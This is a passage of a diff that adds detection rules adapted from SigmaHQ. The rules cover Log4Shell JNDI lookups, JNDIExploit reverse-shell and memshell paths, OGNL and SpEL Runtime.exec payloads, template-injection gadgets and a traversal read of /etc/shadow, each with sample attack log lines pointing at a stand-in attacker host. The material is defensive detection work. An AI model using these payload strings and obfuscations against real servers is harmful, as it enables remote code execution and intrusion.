+      - 'Nov 20 15:17:00 jb01 bash[685]: HISTORY: bash -c /bin/bash --version'
+
+- id: mention.sigma_jndiexploit_paths
+  title: JNDIExploit payload paths (Sigma "JNDIExploit Pattern")
+  match:
+    literal:
+      - '/Basic/Command/Base64/'
+      - '/Basic/ReverseShell/'
+      - '/Basic/TomcatMemshell'
+      - '/Basic/JettyMemshell'
+      - '/Basic/WeblogicMemshell'
+      - '/Basic/JBossMemshell'
+      - '/Basic/WebsphereMemshell'
+      - '/Basic/SpringMemshell'
+      - '/Deserialization/URLDNS/'
+      - '/Deserialization/CommonsCollections1/Dnslog/'
+      - '/Deserialization/CommonsCollections2/Command/Base64/'
+      - '/Deserialization/CommonsBeanutils1/ReverseShell/'
+      - '/Deserialization/Jre8u20/TomcatMemshell'
+      - '/TomcatBypass/Dnslog/'
+      - '/TomcatBypass/Command/'
+      - '/TomcatBypass/ReverseShell/'
+      - '/TomcatBypass/TomcatMemshell'
+      - '/TomcatBypass/SpringMemshell'
+      - '/GroovyBypass/Command/'
+      - '/WebsphereBypass/Upload/'
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: JNDIExploit Pattern (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_jndi_exploit.yml
+    license: DRL-1.1
+    upstream_id: 412d55bc-7737-4d25-9542-5b396867ce55
+  rationale: >-
+    These are the LDAP reference paths of the JNDIExploit server used in Log4Shell and other JNDI injection
+    exploitation; a request or log line carrying one is an exploitation attempt. The rule lists 'legitimate apps that
+    use these paths' as a false positive, which is rare in practice.
+  examples:
+    positive:
+      - '203.0.113.50 - - [20/Nov/2026:15:18:00 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/Command/Base64/d2dldCBodHRw} HTTP/1.1" 200 12 "-" "curl/8.0"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:32 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/ReverseShell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:33 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/TomcatMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:34 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/JettyMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:35 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/WeblogicMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:36 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/JBossMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:37 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/WebsphereMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:38 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Basic/SpringMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:39 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/URLDNS/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:40 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/CommonsCollections1/Dnslog/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:41 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/CommonsCollections2/Command/Base64/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:42 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/CommonsBeanutils1/ReverseShell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:43 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/Deserialization/Jre8u20/TomcatMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:44 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/Dnslog/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:45 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/Command/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:46 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/ReverseShell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:47 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/TomcatMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:48 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/TomcatBypass/SpringMemshell/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:49 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/GroovyBypass/Command/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:50 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/WebsphereBypass/Upload/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:15:19:00 +0000] "GET /docs/basic/commands.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:15:20:00 +0000] "GET /api/deserialization/status HTTP/1.1" 200 12 "-" "kube-probe/1.29"'
+
+- id: mention.sigma_java_payload_strings
+  title: OGNL and Java expression payloads (Sigma "Java Payload Strings")
+  match:
+    literal:
+      - '%24%7B%28%23a%3D%40'
+      - '${(#a=@'
+      - '%24%7B%40java'
+      - '${@java'
+      - '%2F%24%7B%23'
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Java Payload Strings (frack113, Harjot Singh, @cyb3rjy0t)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_java_payload_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 583aa0a2-30b1-4d62-8bf3-ab73689efe6c
+  rationale: >-
+    OGNL expression openers and Runtime.exec calls, plain and URL-encoded, from Confluence (CVE-2022-26134,
+    CVE-2021-26084) and Struts exploits. They do not occur in normal requests or application logs. The short keywords
+    '/${#' and 'new+java.' and the Runtime.exec keywords, which Java applications also log, are a separate medium
+    entry.
+  examples:
+    positive:
+      - '203.0.113.51 - - [20/Nov/2026:15:21:00 +0000] "GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/ HTTP/1.1" 302 0 "-" "python-requests/2.31"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:34 +0000] "GET /%24%7B%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/ HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.51 - - [21/Nov/2026:09:01:35 +0000] "POST /struts2/upload.action HTTP/1.1" 200 0 "-" "-" body="queryString=aaa${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\"))}"'
+      - '203.0.113.51 - - [21/Nov/2026:09:01:36 +0000] "POST /pages/createpage-entervariables.action HTTP/1.1" 200 0 "-" "-" body="queryString=${@java.lang.Runtime@getRuntime().exec(\"id\")}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:37 +0000] "GET /%2F%24%7B%23java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/ HTTP/1.1" 400 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:15:22:00 +0000] "GET /wiki/spaces/ENG/pages/123 HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '2026-11-20 15:23:00 INFO  [main] java.lang.Runtime: available processors 8'
+
+- id: mention.sigma_java_payload_unicode_quote
+  title: 'Unicode escape u0022 before a java.* class name (Sigma "Java Payload Strings")'
+  match:
+    anchored: 'u0022java\.lang\.(?:Runtime|ProcessBuilder|ProcessImpl)\b'
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Java Payload Strings (frack113, Harjot Singh, @cyb3rjy0t)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_java_payload_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 583aa0a2-30b1-4d62-8bf3-ab73689efe6c
+  rationale: >-
+    The rule's 'u0022java' keyword with the class-name context it is there for: OGNL payloads against Confluence and
+    Struts escape the quote as \u0022 before java.lang.Runtime or ProcessBuilder. The bare keyword is too short to
+    stand alone, and escaped class names in ordinary JSON error output (\u0022java.lang.NullPointerException) are
+    not matched.
+  examples:
+    positive:
+      - '203.0.113.51 - - [20/Nov/2026:15:21:30 +0000] "GET /pages/x.action?q=%7B%40java.lang.Class%40forName(%5Cu0022java.lang.Runtime%5Cu0022) HTTP/1.1" 302 0 "-" "-" decoded="\u0022java.lang.Runtime\u0022"'
+    negative:
+      - '2026-11-20 15:21:31 INFO  [main] api: {"lang":"\u0022javascript\u0022"}'
+      - '10.0.3.8 - - [20/Nov/2026:15:21:32 +0000] "GET /search?q=java HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '2026-11-20 15:21:33 ERROR [api] {"error":"\u0022java.lang.NullPointerException\u0022"}'
+
+- id: mention.sigma_java_payload_short
+  title: Short Java payload fragments (Sigma "Java Payload Strings")
+  match:
+    literal: ['/${#', 'new+java.', 'getRuntime().exec(', 'getRuntime%28%29.exec%28']
+  case_sensitive: false
+  strength: medium
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Java Payload Strings (frack113, Harjot Singh, @cyb3rjy0t)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_java_payload_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 583aa0a2-30b1-4d62-8bf3-ab73689efe6c
+  rationale: >-
+    Short fragments of OGNL and Java object creation in URLs, and the Runtime.exec call that most Java RCE payloads
+    end in. The fragments are short enough that search parameters and template URLs can contain them, and
+    applications that run helper programs log Runtime.exec calls, so they are medium.
+  examples:
+    positive:
+      - '203.0.113.51 - - [20/Nov/2026:15:24:00 +0000] "GET /${#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false}.action HTTP/1.1" 404 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:15:25:00 +0000] "GET /search?q=java+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:15:26:00 +0000] "GET /static/${version}/app.js HTTP/1.1" 404 0 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_log4j_jndi_lookup
+  title: Log4Shell JNDI lookup strings (Sigma "Log4j RCE CVE-2021-44228 Generic")
+  match:
+    literal:
+      - '${jndi:ldap:/'
+      - '${jndi:rmi:/'
+      - '${jndi:ldaps:/'
+      - '${jndi:dns:/'
+      - '/$%7bjndi:'
+      - '%24%7bjndi:'
+      - '$%7Bjndi:'
+      - '%2524%257Bjndi'
+      - '%2F%252524%25257Bjndi%3A'
+      - '${jndi:${lower:'
+      - '${::-j}${'
+      - '${jndi:nis'
+      - '${jndi:nds'
+      - '${jndi:corba'
+      - '${jndi:iiop'
+      - 'Reference Class Name: foo'
+      - '${${env:BARFOO:-j}'
+      - '${::-l}${::-d}${::-a}${::-p}'
+      - '${base64:JHtqbmRp'
+      - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'
+      - '${${lower:j}ndi:'
+      - '${${upper:j}ndi:'
+      - '${${::-j}${::-n}${::-d}${::-i}:'
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Log4j RCE CVE-2021-44228 Generic (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules-emerging-threats/2021/Exploits/CVE-2021-44228/web_cve_2021_44228_log4j.yml
+    license: DRL-1.1
+    upstream_id: 5ea8faa8-db8b-45be-89b0-151b84c82702
+  rationale: >-
+    JNDI lookup expressions and their obfuscations are Log4Shell exploitation or scanning wherever they appear (URLs,
+    headers, usernames, application logs). The upstream rule excludes Nessus probes ('w.nessus.org/nessus',
+    '/nessus}'); the schema has no exclusion, so an authorized Nessus scan is the known benign match here and the
+    probe's callback host tells them apart.
+  examples:
+    positive:
+      - '203.0.113.52 - - [20/Nov/2026:15:27:00 +0000] "GET / HTTP/1.1" 200 812 "-" "${jndi:ldap://203.0.113.52:1389/a}"'
+      - '2026-11-20 15:28:00 WARN  [http-nio-8080-exec-3] LoginController: failed login for user ${${lower:j}ndi:ldap://x.example.net/a}'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:51 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:rmi://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:52 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:ldaps://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:53 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:dns://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:54 +0000] "GET / HTTP/1.1" 400 0 "-" "/$%7bjndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:55 +0000] "GET / HTTP/1.1" 400 0 "-" "%24%7bjndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:56 +0000] "GET / HTTP/1.1" 400 0 "-" "$%7Bjndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:57 +0000] "GET / HTTP/1.1" 400 0 "-" "%2524%257Bjndi://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:58 +0000] "GET / HTTP/1.1" 400 0 "-" "%2F%252524%25257Bjndi%3A://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:59 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:${lower:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:00 +0000] "GET / HTTP/1.1" 400 0 "-" "${::-j}${ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:01 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:nis://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:02 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:nds://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:03 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:corba://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:04 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:iiop://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:05 +0000] "GET / HTTP/1.1" 400 0 "-" "Reference Class Name: foo://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:06 +0000] "GET / HTTP/1.1" 400 0 "-" "${${env:BARFOO:-j}x://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:07 +0000] "GET / HTTP/1.1" 400 0 "-" "${::-l}${::-d}${::-a}${::-p}x://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:08 +0000] "GET / HTTP/1.1" 400 0 "-" "${base64:JHtqbmRp://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:09 +0000] "GET / HTTP/1.1" 400 0 "-" "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:10 +0000] "GET / HTTP/1.1" 400 0 "-" "${${upper:j}ndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:11 +0000] "GET / HTTP/1.1" 400 0 "-" "${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.52:1389/a}"'
+    negative:
+      - '2026-11-20 15:29:00 INFO  [main] org.apache.catalina.core.NamingContextListener: Creating JNDI naming context'
+      - '10.0.3.8 - - [20/Nov/2026:15:30:00 +0000] "GET /config?template=${user.home} HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
+
+- id: mention.sigma_jvm_jndimanager
+  title: 'Log4j JndiManager class name in application text (Sigma JVM JNDI injection rule)'
+  match:
+    literal: ['org.apache.logging.log4j.core.net.JndiManager']
+  case_sensitive: false
+  strength: medium
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential JNDI Injection Exploitation In JVM Based Application (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/jvm/java_jndi_injection_exploitation_attempt.yml
+    license: DRL-1.1
+    upstream_id: bb0e9cec-d4da-46f5-997f-22efc59f3dca
+  rationale: >-
+    Log4j's JndiManager shows up in stack traces when a JNDI lookup inside a logged message is resolved, which is the
+    Log4Shell path. Applications that use JNDI appenders on purpose also log it, so it is medium.
+  examples:
+    positive:
+      - '2026-11-20 15:31:00 WARN  [main] org.apache.logging.log4j.core.net.JndiManager: Error looking up JNDI resource [ldap://203.0.113.52:1389/a]'
+    negative:
+      - '2026-11-20 15:32:00 INFO  [main] org.apache.logging.log4j.core.config.ConfigurationFactory: using log4j2.xml'
+      - '2026-11-20 15:33:00 INFO  [main] org.apache.logging.log4j.core.appender.RollingFileAppender: rolled over'
+
+- id: mention.sigma_jvm_jndi_ldap
+  title: 'JDK LDAP JNDI class names in application text (Sigma JVM JNDI injection rule)'
+  match:
+    literal: ['com.sun.jndi.ldap.']
+  case_sensitive: false
+  strength: weak
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential JNDI Injection Exploitation In JVM Based Application (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/jvm/java_jndi_injection_exploitation_attempt.yml
+    license: DRL-1.1
+    upstream_id: bb0e9cec-d4da-46f5-997f-22efc59f3dca
+  rationale: >-
+    Exploited JNDI lookups leave com.sun.jndi.ldap frames in stack traces, but every Java application that talks to
+    a directory uses the same classes (LdapCtxFactory), so this is a weak candidate.
+  examples:
+    positive:
+      - '2026-11-20 15:34:00 ERROR [exec-4] javax.naming.CommunicationException: 203.0.113.52:1389 at com.sun.jndi.ldap.Connection.<init>(Connection.java:252)'
+    negative:
+      - '2026-11-20 15:35:00 INFO  [main] org.springframework.ldap.core.LdapTemplate: bound to ldaps://dc01.corp.example.org'
+      - '2026-11-20 15:36:00 INFO  [main] javax.naming.InitialContext: environment loaded'
+
+- id: mention.sigma_jvm_ognl_exception
+  title: 'OGNL exception name in application text (Sigma "Potential OGNL Injection Exploitation In JVM Based Application")'
+  match:
+    literal: ['org.apache.commons.ognl.OgnlException']
+  case_sensitive: false
+  strength: medium
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential OGNL Injection Exploitation In JVM Based Application (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/jvm/java_ognl_injection_exploitation_attempt.yml
+    license: DRL-1.1
+    upstream_id: 4d0af518-828e-4a04-a751-a7d03f3046ad
+  rationale: >-
+    OGNL evaluation failures follow injection attempts against Struts and Confluence (CVE-2017-5638, CVE-2022-26134).
+    Application bugs throw the same exception, so it is medium. The rule's 'ExpressionSyntaxException' keyword is a
+    separate weak entry.
+  examples:
+    positive:
+      - '2026-11-20 15:37:00 ERROR [http-8090-3] org.apache.commons.ognl.OgnlException: source is null for getProperty(null, "class")'
+    negative:
+      - '2026-11-20 15:38:00 INFO  [main] com.opensymphony.xwork2.config.providers.XmlConfigurationProvider: Parsing struts.xml'
+      - '2026-11-20 15:39:00 ERROR [http-8090-3] java.lang.NullPointerException: user is null'
+
+- id: mention.sigma_jvm_weak_exceptions
+  title: JVM process-execution and expression exceptions (Sigma JVM application rules)
+  match:
+    literal: ['ExpressionSyntaxException', 'java.lang.ProcessImpl', 'java.lang.ProcessBuilder', 'Cannot run program']
+  case_sensitive: false
+  strength: weak
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Process Execution Error In JVM Based Application (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/jvm/java_rce_exploitation_attempt.yml
+    license: DRL-1.1
+    upstream_id: d65f37da-a26a-48f8-8159-3dde96680ad2
+  rationale: >-
+    A JVM failing to start an external program, or an expression syntax error, can be an injected command that did not
+    resolve. Ordinary applications start helper programs and hit missing binaries too, so these are weak candidates.
+    ExpressionSyntaxException comes from the OGNL rule 4d0af518-828e-4a04-a751-a7d03f3046ad.
+  examples:
+    positive:
+      - '2026-11-20 15:40:00 ERROR [exec-7] java.io.IOException: Cannot run program "curl": error=2, No such file or directory at java.lang.ProcessBuilder.start'
+    negative:
+      - '2026-11-20 15:41:00 INFO  [main] com.example.App: started in 2.1s'
+      - '2026-11-20 15:42:00 WARN  [main] com.example.Cache: eviction took 120ms'
+
+- id: mention.sigma_spring_spel_exception
+  title: SpEL evaluation exception (Sigma "Potential SpEL Injection In Spring Framework")
+  match:
+    literal: ['org.springframework.expression.ExpressionException']
+  case_sensitive: false
+  strength: medium
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential SpEL Injection In Spring Framework (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/spring/spring_spel_injection.yml
+    license: DRL-1.1
+    upstream_id: e9edd087-89d8-48c9-b0b4-5b9bb10896b8
+  rationale: >-
+    SpEL injection (Spring Cloud Function CVE-2022-22963, Spring4Shell-era probes) leaves expression exceptions in the
+    log when the payload is malformed for the context; ordinary code errors raise it too, so it is medium.
+  examples:
+    positive:
+      - '2026-11-20 15:43:00 ERROR [reactor-http-epoll-2] org.springframework.expression.ExpressionException: Expression [T(java.lang.Runtime).getRuntime()] @0: EL1043E'
+    negative:
+      - '2026-11-20 15:44:00 INFO  [main] org.springframework.boot.SpringApplication: Started in 4.2 seconds'
+      - '2026-11-20 15:45:00 WARN  [main] org.springframework.context.support.AbstractApplicationContext: refresh attempt'
+
+- id: mention.sigma_nodejs_child_process
+  title: Node.js child_process error (Sigma "Potential RCE Exploitation Attempt In NodeJS")
+  match:
+    literal: ['node:child_process']
+  case_sensitive: false
+  strength: weak
+  attack: [T1190, T1059.007]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential RCE Exploitation Attempt In NodeJS (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/nodejs/nodejs_rce_exploitation_attempt.yml
+    license: DRL-1.1
+    upstream_id: 97661d9d-2beb-4630-b423-68985291a8af
+  rationale: >-
+    A child_process frame in a Node.js error can be an injected command that failed. Headless-browser and build tools
+    throw the same errors (the rule names Puppeteer), so it is a weak candidate.
+  examples:
+    positive:
+      - '2026-11-20 15:46:00 Error: spawn sh ENOENT at ChildProcess._handle.onexit (node:internal/child_process:284:19) at node:child_process:1'
+    negative:
+      - '2026-11-20 15:47:00 info: server listening on :3000'
+      - '2026-11-20 15:48:00 Error: connect ECONNREFUSED 127.0.0.1:5432 at TCPConnectWrap.afterConnect [as oncomplete] (node:net:1555:16)'
+
+- id: mention.sigma_velocity_template_errors
+  title: Velocity template errors (Sigma "Potential Server Side Template Injection In Velocity")
+  match:
+    literal: ['ParseErrorException', 'VelocityException', 'TemplateInitException']
+  case_sensitive: false
+  strength: weak
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential Server Side Template Injection In Velocity (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/velocity/velocity_ssti_injection.yml
+    license: DRL-1.1
+    upstream_id: 16c86189-b556-4ee8-b4c7-7e350a195a4f
+  rationale: >-
+    Template parse failures follow template-injection probes, but missing or broken templates cause the same errors,
+    so they are weak candidates.
+  examples:
+    positive:
+      - '2026-11-20 15:49:00 ERROR [exec-2] org.apache.velocity.exception.ParseErrorException: Encountered "#set($x=" at line 1'
+    negative:
+      - '2026-11-20 15:50:00 INFO  [main] org.apache.velocity.app.VelocityEngine: initialized'
+      - '2026-11-20 15:51:00 WARN  [main] com.example.Mailer: template welcome.vm cached'
+
+- id: mention.sigma_jvm_local_file_read
+  title: FileNotFoundException on a traversal path (Sigma "Potential Local File Read Vulnerability In JVM Based Application")
+  match:
+    anchored: 'FileNotFoundException[^\n]{0,200}/\.\./\.\./\.\.'
+  case_sensitive: false
+  strength: medium
+  attack: [T1190, T1083]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Potential Local File Read Vulnerability In JVM Based Application (Moti Harmats)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/application/jvm/java_local_file_read.yml
+    license: DRL-1.1
+    upstream_id: e032f5bc-4563-4096-ae3b-064bab588685
+  rationale: >-
+    The rule needs both 'FileNotFoundException' and '/../../..'. Java prints the exception class before the path, so
+    the anchored form keeps the meaning. A traversal path that reached the file API is a path-traversal attempt; a
+    buggy relative path can produce it too, so it is medium.
+  examples:
+    positive:
+      - '2026-11-20 15:52:00 ERROR [exec-5] java.io.FileNotFoundException: /opt/app/static/../../../../etc/shadow (Permission denied)'
+    negative:
+      - '2026-11-20 15:53:00 ERROR [exec-5] java.io.FileNotFoundException: /opt/app/static/logo.png (No such file or directory)'
+      - '2026-11-20 15:54:00 INFO  [exec-5] com.example.Files: resolved ../config/app.yml'
+
+- id: mention.sigma_ssti_strong
+  title: Template-injection gadget strings (Sigma "Server Side Template Injection Strings")
+  match:
+    literal:
+      - 'freemarker.template.utility.Execute'
+      - '.getClass().forName(''javax.script.ScriptEngineManager'')'
+      - 'T(org.apache.commons.io.IOUtils)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Server Side Template Injection Strings (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_ssti_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: ada3bc4f-f0fd-42b9-ba91-e105e8af7342
+  rationale: >-
+    FreeMarker Execute, the ScriptEngineManager reflection chain and the SpEL IOUtils type reference are
+    command-execution gadgets; they appear in requests only as injection payloads. The rule's GET-only and not-404
+    conditions cannot be expressed and are dropped.
+  examples:
+    positive:
+      - '203.0.113.53 - - [20/Nov/2026:15:55:00 +0000] "GET /preview?t=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")} HTTP/1.1" 200 12 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:59 +0000] "GET /preview?t=${.getClass().forName(''javax.script.ScriptEngineManager'').toString()} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:00 +0000] "GET /preview?t=${T(org.apache.commons.io.IOUtils).toString()} HTTP/1.1" 400 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:15:56:00 +0000] "GET /docs/freemarker/template-guide HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '2026-11-20 15:57:00 INFO  [main] freemarker.cache: Template loaded: welcome.ftl'
+
+- id: mention.sigma_ssti_openers
+  title: Template expression openers in a parameter (Sigma "Server Side Template Injection Strings")
+  match:
+    literal: ['=%7B%7B', '=<%=', '=%3C%25=']
+  case_sensitive: false
+  strength: medium
+  attack: [T1190]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Server Side Template Injection Strings (Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_ssti_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: ada3bc4f-f0fd-42b9-ba91-e105e8af7342
